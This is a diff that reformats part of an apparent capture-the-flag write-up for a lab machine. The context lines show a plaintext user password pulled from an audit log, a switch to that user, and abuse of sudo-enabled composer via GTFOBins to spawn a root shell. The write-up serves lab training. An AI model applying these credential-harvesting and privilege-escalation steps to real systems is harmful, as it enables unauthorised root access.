@@ -472,8 +472,9 @@ uid=1004(ch4p) gid=1004(ch4p) groups=1004(ch4p)
 uid=1005(g0blin) gid=1005(g0blin) groups=1005(g0blin)
 ```
 
-*Сry0l1t3* belongs to the *adminsitrator group*, that can read logs in */var/log*. 
-*egre55 has* sudo privelages. Interesting..
+**cry0l1t3** belongs to the *adminsitrator group*, that can read logs in */var/log*. 
+
+**egre55** has sudo privelages. Interesting..
 
 Run linPEAS as Сry0l1t3 to check every logs.
 
@@ -485,7 +486,8 @@ We find **mrb3n's password** in */var/log/audit/audit.log* :
 2. 08/12/2020 02:28:13 84 0 ? 1 su "mrb3n_Ac@d3my!",<nl>
 ```
 
-Login as mrb3n and check privelages
+Login as **mrb3n** and check privelages
+
 ```
 cry0l1t3@academy:~$ su mrb3n
 Password: 
@@ -566,6 +568,7 @@ Available commands:
 We see, that composer can run scriots from composer.json `run-script           [run] Runs the scripts defined in composer.json.`
 
 Ok, we need json file in /tmp to run it. Also composer can run scripts, so...
+
 Checking [GTFObins](https://gtfobins.github.io/gtfobins/composer/)
 
 ```
@@ -584,7 +587,7 @@ Do not run Composer as root/super user! See https://getcomposer.org/root for det
 root
 ```
 
-And we got root /bin/bash. Get root.txt
+And we got root /bin/bash. Get **root.txt**
 
 ```
 > /bin/sh -i 0<&3 1>&3 2>&3
